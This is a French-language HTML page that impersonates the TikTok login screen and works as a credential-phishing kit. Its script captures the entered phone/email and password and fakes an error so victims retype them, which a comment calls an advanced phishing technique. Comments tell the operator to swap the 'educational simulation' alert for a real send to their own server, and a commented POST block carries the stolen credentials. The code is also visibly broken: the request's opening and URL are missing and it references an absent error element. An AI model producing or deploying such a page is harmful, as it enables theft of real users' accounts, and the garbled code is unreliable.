<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #f2f2f2;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .login-box {
            width: 100%;
            max-width: 375px;
            background-color: white;
            border-radius: 20px;
            padding: 40px 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            background: linear-gradient(45deg, #000, #ff0050);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            color: white;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        .title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #000;
        }
        .subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #000;
        }
        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background-color: #f8f8f8;
            transition: border-color 0.3s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #000;
            background-color: white;
        }
        .forgot-password {
            text-align: right;
            margin-bottom: 20px;
        }
        .forgot-password a {
            font-size: 14px;
            color: #666;
            text-decoration: none;
        }
        .forgot-password a:hover {
            color: #000;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #000;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #333;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #666;
            font-size: 14px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .divider::before {
            margin-right: 10px;
        }
        .divider::after {
            margin-left: 10px;
        }
        .signup-link {
            font-size: 14px;
            color: #666;
        }
        .signup-link a {
            color: #000;
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #999;
        }
        .footer a {
            color: #999;
            text-decoration: none;
        }
        .footer a:hover {
            color: #666;
        }
        .error-message {
            color: #ff3333;
            font-size: 14px;
            margin-bottom: 15px;
            text-align: left;
        }
        @media (max-width: 375px) {
            .login-box {
                padding: 30px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">🎵</div>
            <h1 class="title">Connexion</h1>
            <p class="subtitle">Connecte-toi pour continuer</p>

            <form id="loginForm">
                <div class="input-group">
                    <label for="username">Téléphone ou email</label>
                    <input type="text" id="username" name="username" placeholder="Numéro de téléphone ou email" required>
                </div>

                <div class="input-group">
                    <label for="password">Mot de passe</label>
                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
                </div>

                <div class="forgot-password">
                    <a href="#">Mot de passe oublié ?</a>
                </div>

                <button type="submit" class="login-btn">Se connecter</button>

                <div class="divider">OU</div>

                <div class="signup-link">
                    Nouveau sur TikTok ? <a href="#">Inscris-toi</a>
                </div>
            </form>

            <div class="footer">
                <p>© 2024 TikTok</p>
                <p><a href="#">Conditions d'utilisation</a> • <a href="#">Politique de confidentialité</a> • <a href="#">Centre de confidentialité</a></p>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Simuler une erreur pour forcer l'utilisateur à retaper ses infos (technique de phishing avancée)
            setTimeout(() => {
                document.getElementById('loginForm').reset();
                document.querySelector('.error-message').textContent = 'Une erreur est survenue. Veuillez réessayer.';
                document.querySelector('.error-message').style.display = 'block';
            }, 1000);

            // Envoi des données vers ton serveur (simulé ici avec une alerte)
            // Remplace cette partie par un vrai envoi AJAX vers ton serveur si tu veux capturer les données
            alert('⚠️ Attention : Ce formulaire est une simulation éducative. En cas d\'utilisation réelle, les données seraient envoyées vers un serveur malveillant.');

            // Exemple de code pour envoyer les données (à NE PAS UTILISER SANS AUTORISATION)

                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: username,
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Données envoyées :', data);
            })
            .catch(error => {
                console.error('Erreur :', error);
            });
            */
        });
    </script>
</body>
</html>
